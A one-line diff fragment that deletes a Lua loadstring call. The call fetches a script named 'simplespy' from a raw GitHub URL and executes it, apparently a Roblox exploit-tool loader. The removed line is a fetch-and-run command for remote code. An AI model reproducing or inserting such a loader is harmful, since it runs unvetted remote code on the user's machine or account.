@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/paygammy/simplespy/root/scripts/main.lua", true))()
